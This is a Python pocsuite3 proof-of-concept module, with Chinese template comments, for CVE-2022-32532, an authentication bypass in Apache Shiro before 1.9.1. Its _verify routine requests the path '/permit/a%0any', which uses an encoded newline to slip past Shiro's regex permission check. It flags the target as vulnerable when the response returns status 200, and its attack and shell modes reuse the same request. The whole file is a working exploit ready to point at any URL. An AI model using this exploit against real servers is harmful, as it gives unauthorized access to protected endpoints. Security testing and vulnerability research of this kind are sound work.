from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger

class ShiroPOC(POCBase):
    vulID = '99534'  # Seebug 漏洞收录 ID，如果没有则为 0
    version = '1'  # PoC 的版本，默认为 1
    references = ['https://github.com/4ra1n/CVE-2022-32532']  # 漏洞来源地址，0day 不用写
    name = 'Apache shiro 登录绕过 (CVE-2022-32532)'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appName = 'shiro'  # 漏洞应用名称
    appVersion = '<1.9.1'  # 漏洞影响版本
    vulType = 'Login Bypass'  # 漏洞类型，参见漏洞类型规范表
    desc = '未经授权的远程攻击者可通过构造恶意数据包绕过身份认证，导致配置的权限验证失效'  # 漏洞简要描述
    samples = ['http://127.0.0.1:8080']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = '''
    pocsuite  -r poc文件名 -u 靶机地址 
    pocsuite  -r _32532_shiro_1_9_0_login_bypass.py -u http://localhost:8080 
    '''
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # PoC 的分类
    protocol = POC_CATEGORY.PROTOCOL.HTTP  # PoC 的默认协议，方便对 url 格式化
    protocol_default_port = 8080  # 目标的默认端口，当提供的目标不包含端口的时候，方便对 url 格式化

    def _verify(self):
        result = {}
        url = self.url + "/permit/a%0any"

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Priority": "u=0, i"
        }
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['PostData'] = response.text
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    
    def _shell(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Failed')
        return output

register_poc(ShiroPOC)